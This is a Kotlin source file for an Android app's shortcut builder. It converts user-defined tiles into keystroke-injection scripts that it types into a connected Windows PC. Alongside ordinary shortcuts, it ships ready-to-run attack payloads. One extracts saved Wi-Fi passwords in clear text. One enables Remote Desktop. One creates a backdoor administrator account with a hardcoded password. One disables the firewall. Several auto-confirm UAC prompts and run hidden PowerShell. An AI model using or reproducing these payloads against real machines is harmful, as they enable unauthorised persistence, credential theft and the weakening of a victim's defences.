package com.commvault.commlink.ui.shortcuts

import android.content.Context
import androidx.compose.runtime.mutableStateListOf
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.commvault.commlink.ui.CommLinkViewModel
import com.commvault.commlink.ui.shortcuts.model.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject

class ShortcutsViewModel : ViewModel() {

    private val _shortcuts = MutableStateFlow<List<Shortcut>>(emptyList())
    val shortcuts: StateFlow<List<Shortcut>> = _shortcuts

    private val _isExecuting = MutableStateFlow(false)
    val isExecuting: StateFlow<Boolean> = _isExecuting

    private val _executionLog = MutableStateFlow<List<String>>(emptyList())
    val executionLog: StateFlow<List<String>> = _executionLog

    // Current builder state
    val builderTiles = mutableStateListOf<ActionTile>()
    private val _builderName = MutableStateFlow("New Shortcut")
    val builderName: StateFlow<String> = _builderName
    private val _builderIconIndex = MutableStateFlow(0)
    val builderIconIndex: StateFlow<Int> = _builderIconIndex
    private val _builderColorIndex = MutableStateFlow(0)
    val builderColorIndex: StateFlow<Int> = _builderColorIndex

    fun loadShortcuts(context: Context) {
        val prefs = context.getSharedPreferences("commlink_shortcuts", Context.MODE_PRIVATE)
        val json = prefs.getString("shortcuts_list", "[]") ?: "[]"
        try {
            val arr = JSONArray(json)
            val list = mutableListOf<Shortcut>()
            for (i in 0 until arr.length()) {
                val obj = arr.getJSONObject(i)
                val tilesArr = obj.getJSONArray("tiles")
                val tiles = mutableListOf<ActionTile>()
                for (j in 0 until tilesArr.length()) {
                    val t = tilesArr.getJSONObject(j)
                    tiles.add(ActionTile(
                        id = t.getString("id"),
                        type = ActionType.valueOf(t.getString("type")),
                        param = t.optString("param", "")
                    ))
                }
                list.add(Shortcut(
                    id = obj.getString("id"),
                    name = obj.getString("name"),
                    iconIndex = obj.optInt("iconIndex", 0),
                    colorIndex = obj.optInt("colorIndex", 0),
                    tiles = tiles,
                    createdAt = obj.optLong("createdAt", System.currentTimeMillis())
                ))
            }
            _shortcuts.value = list
        } catch (e: Exception) {
            _shortcuts.value = emptyList()
        }
    }

    private fun saveShortcuts(context: Context) {
        val prefs = context.getSharedPreferences("commlink_shortcuts", Context.MODE_PRIVATE)
        val arr = JSONArray()
        _shortcuts.value.forEach { s ->
            val obj = JSONObject()
            obj.put("id", s.id)
            obj.put("name", s.name)
            obj.put("iconIndex", s.iconIndex)
            obj.put("colorIndex", s.colorIndex)
            obj.put("createdAt", s.createdAt)
            val tilesArr = JSONArray()
            s.tiles.forEach { t ->
                val tObj = JSONObject()
                tObj.put("id", t.id)
                tObj.put("type", t.type.name)
                tObj.put("param", t.param)
                tilesArr.put(tObj)
            }
            obj.put("tiles", tilesArr)
            arr.put(obj)
        }
        prefs.edit().putString("shortcuts_list", arr.toString()).apply()
    }

    fun deleteShortcut(context: Context, id: String) {
        _shortcuts.value = _shortcuts.value.filter { it.id != id }
        saveShortcuts(context)
    }

    // ─── Builder ───
    fun initBuilder(shortcut: Shortcut? = null) {
        builderTiles.clear()
        if (shortcut != null) {
            _builderName.value = shortcut.name
            _builderIconIndex.value = shortcut.iconIndex
            _builderColorIndex.value = shortcut.colorIndex
            builderTiles.addAll(shortcut.tiles)
        } else {
            _builderName.value = "New Shortcut"
            _builderIconIndex.value = 0
            _builderColorIndex.value = 0
        }
    }

    fun setBuilderName(name: String) { _builderName.value = name }
    fun setBuilderIcon(index: Int) { _builderIconIndex.value = index }
    fun setBuilderColor(index: Int) { _builderColorIndex.value = index }

    fun addTile(type: ActionType, param: String = "") {
        val initialParam = when {
            param.isNotEmpty() -> param
            type == ActionType.DELAY -> "500"
            type == ActionType.MOUSE_CLICK -> "Left"
            else -> param
        }
        builderTiles.add(ActionTile(type = type, param = initialParam))
    }

    fun removeTile(index: Int) {
        if (index in builderTiles.indices) builderTiles.removeAt(index)
    }

    fun updateTileParam(index: Int, param: String) {
        if (index in builderTiles.indices) {
            builderTiles[index] = builderTiles[index].copy(param = param)
        }
    }

    fun moveTile(from: Int, to: Int) {
        if (from in builderTiles.indices && to in builderTiles.indices) {
            val item = builderTiles.removeAt(from)
            builderTiles.add(to, item)
        }
    }

    fun saveCurrentShortcut(context: Context, editId: String? = null) {
        val shortcut = Shortcut(
            id = editId ?: java.util.UUID.randomUUID().toString(),
            name = _builderName.value,
            iconIndex = _builderIconIndex.value,
            colorIndex = _builderColorIndex.value,
            tiles = builderTiles.toList()
        )
        val current = _shortcuts.value.toMutableList()
        val existingIndex = current.indexOfFirst { it.id == shortcut.id }
        if (existingIndex >= 0) {
            current[existingIndex] = shortcut
        } else {
            current.add(shortcut)
        }
        _shortcuts.value = current
        saveShortcuts(context)
    }

    // ─── Execution ───
    fun executeShortcut(shortcut: Shortcut, commLinkViewModel: CommLinkViewModel) {
        val script = convertToScript(shortcut.tiles)
        commLinkViewModel.runMacroScript(script)
    }

    fun executeTiles(tiles: List<ActionTile>, commLinkViewModel: CommLinkViewModel) {
        val script = convertToScript(tiles)
        commLinkViewModel.runMacroScript(script)
    }

    fun executePayload(script: String, commLinkViewModel: CommLinkViewModel) {
        commLinkViewModel.runMacroScript(script)
    }

    private fun convertToScript(tiles: List<ActionTile>): String {
        val sb = StringBuilder()
        for (tile in tiles) {
            when (tile.type) {
                ActionType.LOCK_PC -> sb.appendLine("GUI l")
                ActionType.UNLOCK_PC -> {
                    sb.appendLine("DELAY 500")
                    sb.appendLine("ENTER")
                    sb.appendLine("DELAY 800")
                    sb.appendLine("STRING ${tile.param}")
                    sb.appendLine("ENTER")
                }
                ActionType.MINIMIZE_ALL -> sb.appendLine("GUI d")
                ActionType.TASK_MANAGER -> sb.appendLine("CTRL SHIFT ESC")
                ActionType.OPEN_SETTINGS -> sb.appendLine("GUI i")
                ActionType.OPEN_FILE_EXPLORER -> sb.appendLine("GUI e")
                ActionType.SCREENSHOT -> sb.appendLine("GUI SHIFT s")
                ActionType.OPEN_RUN -> sb.appendLine("GUI r")
                ActionType.CLOSE_WINDOW -> sb.appendLine("ALT F4")
                ActionType.SNAP_LEFT -> sb.appendLine("GUI LEFT")
                ActionType.SNAP_RIGHT -> sb.appendLine("GUI RIGHT")
                ActionType.MAXIMIZE_WINDOW -> sb.appendLine("GUI UP")
                ActionType.MINIMIZE_WINDOW -> sb.appendLine("GUI DOWN")
                ActionType.SWITCH_WINDOW -> sb.appendLine("ALT TAB")
                ActionType.TASK_VIEW -> sb.appendLine("GUI TAB")
                ActionType.NEXT_DESKTOP -> sb.appendLine("GUI CTRL RIGHT")
                ActionType.PREV_DESKTOP -> sb.appendLine("GUI CTRL LEFT")
                ActionType.NEW_DESKTOP -> sb.appendLine("GUI CTRL d")
                ActionType.CLOSE_DESKTOP -> sb.appendLine("CTRL GUI F4")
                ActionType.LAUNCH_APP, ActionType.RUN_COMMAND -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING ${tile.param}")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.LAUNCH_URL -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING ${tile.param}")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.SEARCH_WEB -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING https://www.google.com/search?q=${tile.param.replace(" ", "+")}")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.OPEN_CMD -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING cmd")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.OPEN_CMD_ADMIN -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING cmd")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("CTRL SHIFT ENTER")
                    sb.appendLine("DELAY 1000")
                    sb.appendLine("ALT y")
                }
                ActionType.OPEN_POWERSHELL -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING powershell")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.OPEN_NOTEPAD -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING notepad")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.OPEN_CALC -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING calc")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.OPEN_PAINT -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING mspaint")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.OPEN_VSCODE -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING code")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.OPEN_REGISTRY -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING regedit")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.OPEN_DEVMGR -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING devmgmt.msc")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.OPEN_DISKMGMT -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING diskmgmt.msc")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.OPEN_SERVICES -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING services.msc")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.OPEN_EVENTVWR -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING eventvwr.msc")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.OPEN_CONTROL_PANEL -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING control")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.OPEN_CHROME -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING chrome")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.OPEN_EDGE -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING msedge")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.OPEN_INCOGNITO -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING chrome --incognito")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.BROWSER_NEW_TAB -> sb.appendLine("CTRL t")
                ActionType.BROWSER_CLOSE_TAB -> sb.appendLine("CTRL w")
                ActionType.BROWSER_REOPEN_TAB -> sb.appendLine("CTRL SHIFT t")
                ActionType.BROWSER_REFRESH -> sb.appendLine("F5")
                ActionType.MEDIA_PLAY_PAUSE -> sb.appendLine("MEDIA PLAYPAUSE")
                ActionType.MEDIA_NEXT -> sb.appendLine("MEDIA NEXT")
                ActionType.MEDIA_PREV -> sb.appendLine("MEDIA PREV")
                ActionType.VOLUME_UP -> sb.appendLine("MEDIA VOL_UP")
                ActionType.VOLUME_DOWN -> sb.appendLine("MEDIA VOL_DOWN")
                ActionType.VOLUME_MUTE -> sb.appendLine("MEDIA MUTE")
                ActionType.TYPE_TEXT -> sb.appendLine("STRING ${tile.param}")
                ActionType.KEYSTROKE -> sb.appendLine(tile.param.uppercase())
                ActionType.PRESS_ENTER -> sb.appendLine("ENTER")
                ActionType.PRESS_TAB -> sb.appendLine("TAB")
                ActionType.PRESS_ESCAPE -> sb.appendLine("ESCAPE")
                ActionType.PRESS_BACKSPACE -> sb.appendLine("BACKSPACE")
                ActionType.MOUSE_CLICK -> {
                    val btn = when(tile.param.lowercase().trim()) {
                        "right" -> 2
                        "middle" -> 4
                        else -> 1
                    }
                    sb.appendLine("MOUSE_CLICK $btn")
                }
                ActionType.MOUSE_MOVE -> sb.appendLine("MOUSE_MOVE ${tile.param}")
                ActionType.MOUSE_SCROLL -> sb.appendLine("MOUSE_SCROLL ${tile.param}")
                ActionType.CLIPBOARD_COPY -> sb.appendLine("CTRL c")
                ActionType.CLIPBOARD_PASTE -> sb.appendLine("CTRL v")
                ActionType.CLIPBOARD_CUT -> sb.appendLine("CTRL x")
                ActionType.SELECT_ALL -> sb.appendLine("CTRL a")
                ActionType.UNDO -> sb.appendLine("CTRL z")
                ActionType.REDO -> sb.appendLine("CTRL y")
                ActionType.OPEN_NETWORK -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING ncpa.cpl")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.FLUSH_DNS -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING cmd /k ipconfig /flushdns")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.IPCONFIG -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING cmd /k ipconfig /all")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.PING_TEST -> {
                    val host = tile.param.ifBlank { "google.com" }
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING cmd /k ping $host")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.NETSTAT -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING cmd /k netstat -an")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.WIFI_PASSWORDS -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING cmd /k netsh wlan show profiles")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.OPEN_DEFENDER -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING windowsdefender:")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.OPEN_FIREWALL -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING firewall.cpl")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.DISABLE_FIREWALL -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING cmd")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("CTRL SHIFT ENTER")
                    sb.appendLine("DELAY 1500")
                    sb.appendLine("ALT y")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING netsh advfirewall set allprofiles state off")
                    sb.appendLine("ENTER")
                }
                ActionType.ENABLE_FIREWALL -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING cmd")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("CTRL SHIFT ENTER")
                    sb.appendLine("DELAY 1500")
                    sb.appendLine("ALT y")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING netsh advfirewall set allprofiles state on")
                    sb.appendLine("ENTER")
                }
                ActionType.SHUTDOWN -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING shutdown /s /t 0")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.RESTART -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING shutdown /r /t 0")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.SLEEP -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.LOG_OFF -> {
                    sb.appendLine("GUI r")
                    sb.appendLine("DELAY 500")
                    sb.appendLine("STRING shutdown /l")
                    sb.appendLine("DELAY 200")
                    sb.appendLine("ENTER")
                }
                ActionType.DELAY -> sb.appendLine("DELAY ${tile.param.ifBlank { "500" }}")
                ActionType.REPEAT -> {
                    // Repeat is handled as a no-op comment; real looping would need the executor
                    sb.appendLine("REM REPEAT ${tile.param}")
                }
                ActionType.COMMENT -> sb.appendLine("REM ${tile.param}")
                ActionType.NOTIFICATION -> sb.appendLine("REM NOTIFY: ${tile.param}")
                ActionType.ASK_INPUT -> sb.appendLine("ASK_INPUT ${tile.param}")
            }
        }
        return sb.toString()
    }

    // ─── Pre-built Payloads ───
    fun getPayloadTemplates(): List<PayloadTemplate> = listOf(
        // Reconnaissance
        PayloadTemplate("p1", "System Info Dump", "Dumps full system info to Desktop", PayloadCategory.RECON,
            "GUI r\nDELAY 500\nSTRING cmd /c systeminfo > %USERPROFILE%\\Desktop\\sysinfo.txt\nDELAY 200\nENTER"),
        PayloadTemplate("p2", "Wi-Fi Password Extractor", "Extracts all saved Wi-Fi passwords", PayloadCategory.RECON,
            "GUI r\nDELAY 500\nSTRING cmd\nDELAY 200\nENTER\nDELAY 500\nSTRING for /f \"tokens=2 delims=:\" %a in ('netsh wlan show profiles ^| find \"Profile\"') do @netsh wlan show profile name=%a key=clear >> %USERPROFILE%\\Desktop\\wifi_passwords.txt\nENTER"),
        PayloadTemplate("p3", "Network Scan", "Shows all network connections", PayloadCategory.RECON,
            "GUI r\nDELAY 500\nSTRING cmd /c netstat -an > %USERPROFILE%\\Desktop\\netstat.txt\nDELAY 200\nENTER"),
        PayloadTemplate("p4", "Installed Programs", "Lists all installed software", PayloadCategory.RECON,
            "GUI r\nDELAY 500\nSTRING cmd /c wmic product get name,version > %USERPROFILE%\\Desktop\\programs.txt\nDELAY 200\nENTER"),
        
        // Persistence
        PayloadTemplate("p5", "Enable RDP", "Enables Remote Desktop Protocol", PayloadCategory.PERSISTENCE,
            "GUI r\nDELAY 500\nSTRING cmd\nDELAY 200\nCTRL SHIFT ENTER\nDELAY 1500\nALT y\nDELAY 500\nSTRING reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nENTER\nDELAY 200\nSTRING netsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes\nENTER"),
        PayloadTemplate("p6", "Create Admin User", "Creates a new local admin account", PayloadCategory.PERSISTENCE,
            "GUI r\nDELAY 500\nSTRING cmd\nDELAY 200\nCTRL SHIFT ENTER\nDELAY 1500\nALT y\nDELAY 500\nSTRING net user commlink Pass123! /add\nENTER\nDELAY 200\nSTRING net localgroup administrators commlink /add\nENTER"),

        // Pranks
        PayloadTemplate("p7", "Fake BSOD", "Full-screen blue screen prank", PayloadCategory.PRANKS,
            "GUI r\nDELAY 500\nSTRING powershell -w hidden -c \"Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Your PC ran into a problem and needs to restart.','CRITICAL_PROCESS_DIED','OK','Error')\"\nDELAY 200\nENTER"),
        PayloadTemplate("p8", "Flip Screen", "Rotates screen upside down", PayloadCategory.PRANKS,
            "CTRL ALT DOWN"),
        PayloadTemplate("p9", "Swap Mouse Buttons", "Swaps left and right mouse buttons", PayloadCategory.PRANKS,
            "GUI r\nDELAY 500\nSTRING powershell -c \"[Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');[System.Windows.Forms.SystemInformation]::MouseButtonsSwapped\"\nDELAY 200\nENTER"),
        PayloadTemplate("p10", "Rick Roll", "Opens Rick Roll in browser", PayloadCategory.PRANKS,
            "GUI r\nDELAY 500\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nDELAY 200\nENTER"),
        PayloadTemplate("p11", "Change Wallpaper", "Downloads and sets a prank wallpaper", PayloadCategory.PRANKS,
            "GUI r\nDELAY 500\nSTRING powershell -w hidden -c \"Invoke-WebRequest -Uri 'https://picsum.photos/1920/1080' -OutFile C:\\temp_wp.jpg; Add-Type -TypeDefinition 'using System.Runtime.InteropServices;public class W{[DllImport(\"\"user32.dll\"\")]public static extern int SystemParametersInfo(int a,int b,string c,int d);}'; [W]::SystemParametersInfo(20,0,'C:\\temp_wp.jpg',3)\"\nDELAY 200\nENTER"),

        // Utility
        PayloadTemplate("p12", "Clear Temp Files", "Cleans temporary files", PayloadCategory.UTILITY,
            "GUI r\nDELAY 500\nSTRING cmd /c del /q/f/s %TEMP%\\*\nDELAY 200\nENTER"),
        PayloadTemplate("p13", "Flush DNS Cache", "Clears DNS resolver cache", PayloadCategory.UTILITY,
            "GUI r\nDELAY 500\nSTRING cmd /c ipconfig /flushdns\nDELAY 200\nENTER"),
        PayloadTemplate("p14", "Disk Cleanup", "Opens disk cleanup utility", PayloadCategory.UTILITY,
            "GUI r\nDELAY 500\nSTRING cleanmgr\nDELAY 200\nENTER"),
        PayloadTemplate("p15", "Empty Recycle Bin", "Permanently deletes recycled items", PayloadCategory.UTILITY,
            "GUI r\nDELAY 500\nSTRING powershell -c \"Clear-RecycleBin -Force\"\nDELAY 200\nENTER"),

        // Network
        PayloadTemplate("p16", "Disable Wi-Fi", "Turns off wireless adapter", PayloadCategory.NETWORK,
            "GUI r\nDELAY 500\nSTRING cmd\nDELAY 200\nCTRL SHIFT ENTER\nDELAY 1500\nALT y\nDELAY 500\nSTRING netsh interface set interface \"Wi-Fi\" disable\nENTER"),
        PayloadTemplate("p17", "Enable Wi-Fi", "Turns on wireless adapter", PayloadCategory.NETWORK,
            "GUI r\nDELAY 500\nSTRING cmd\nDELAY 200\nCTRL SHIFT ENTER\nDELAY 1500\nALT y\nDELAY 500\nSTRING netsh interface set interface \"Wi-Fi\" enable\nENTER"),
        PayloadTemplate("p18", "Reset Network Stack", "Resets TCP/IP and Winsock", PayloadCategory.NETWORK,
            "GUI r\nDELAY 500\nSTRING cmd\nDELAY 200\nCTRL SHIFT ENTER\nDELAY 1500\nALT y\nDELAY 500\nSTRING netsh int ip reset\nENTER\nDELAY 200\nSTRING netsh winsock reset\nENTER"),
    )
}
